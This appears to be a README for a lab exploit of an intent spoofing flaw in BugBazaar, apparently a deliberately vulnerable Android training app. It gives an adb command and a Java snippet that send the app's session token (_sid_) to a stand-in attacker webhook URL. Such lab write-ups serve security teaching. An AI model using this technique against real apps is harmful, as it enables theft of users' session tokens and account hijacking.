# Intent Spoofing
This project can be used to exploit Intent Spoofing vulnerability in [BugBazaar](https://github.com/payatu/BugBazaar)

### How to exploit Intent Spoofing?
1. Install BugBazaar application on device
2. Decompile BugBazaar apk via Jadx-gui
3. Goto AndroidManifest.xml file and search for ExternalAuthLogin
4. You can see intent filters set for ExternalAuthLogin class
5. Goto ExternalAuthLogin class and analyse the code. It can be seen that, this class expect a string extra in return for intent value
6. Run following ADB command:
	- adb shell am start -d "bugbazaar://externalAuthentication" --es ExternalAuthLoginActivity.EXTRA_REDIRECT_URL https://webhookurl
7. Add your webhook url here and check the logs of webhook. You can see the _sid_ token.
8. To exploit this vulnerability via other app, create a new android project with empty activity.
9. In MainActivity.java, add following code under onCreate method:
	
        // Create a new Intent
        Intent intent = new Intent();

        // Set the action and data URI for the Intent
        intent.setAction(Intent.ACTION_VIEW);
        intent.setData(Uri.parse("bugbazaar://externalAuthentication"));

        // Add extra data to the Intent
        intent.putExtra("ExternalAuthLoginActivity.EXTRA_REDIRECT_URL", "https://webhookurl");

        // Start the activity using the Intent
        startActivity(intent);

10. Replace your webhook url here. 
11. Run this application on same device where BugBazaar is installed.
12. Check the webhook logs and you will see the _sid_ token.	
